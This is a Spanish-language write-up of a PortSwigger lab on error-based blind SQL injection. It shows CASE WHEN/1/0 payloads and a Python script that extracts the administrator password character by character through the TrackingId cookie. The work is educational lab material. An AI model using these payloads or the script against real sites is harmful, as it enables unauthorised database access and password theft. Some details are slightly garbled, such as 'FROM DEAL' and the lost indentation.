Blind SQLi — Error Based

Plataforma: PortSwigger Labs Tags: SQLiBlindError

En este tipo de SQL blind nos aprovechamos de errores que podemos inducir en una query dependiendo del resultado

EJ:

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'A' END)='A-- -

esta query evalúa que la condición sea verdadera, si es verdadera causa un error al querer dividir entre 0, si es falsa devuelve A

ya una vez verificada la VULN en la QUERY PHPSSESID vamos a explotarla con este metodo.

[imagen]

como podemos ver con el siguiente paylaod salta un error ya que la condición 1=1 es verdadera y se realiza la operacion 1/0 que da error:

qSfTAstSycf1i74I' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM DEAL)

Por lo tanto podemos construir la siguiente QUERY y aprovecharnos de cuando da error para saber lo que devuelve la QUERY

qSfTAstSycf1i74I' AND (SELECT CASE WHEN (SUBSTRING(password,1,1))='letter' THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')

y hacemos el siguiente SCRIPT para automatizar:

#!/usr/bin/python3

import requests


import string






url_input= 'https://0aec0049046e151780ed08e400fa00af.web-security-academy.net/'


caracters= string.ascii_lowercase + string.ascii_uppercase + string.digits


password= ''



for position in range(1,21):


for letter in caracters:



cookies = {"TrackingId":f"60r9V6o2thyHQdVW' || (SELECT CASE WHEN SUBSTR(password,{position},1)='{letter}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '","session":"cZ88aG3WPV5wkPFGgl0LFlRuHKdjiGnC"}


me_request = requests.get(url=url_input, cookies=cookies)


if 'Internal Server Error' in me_request.text:


password+=letter


print(f"letra de la posicion {position} encontrada --> {letter}")


break


print(" -->", password)
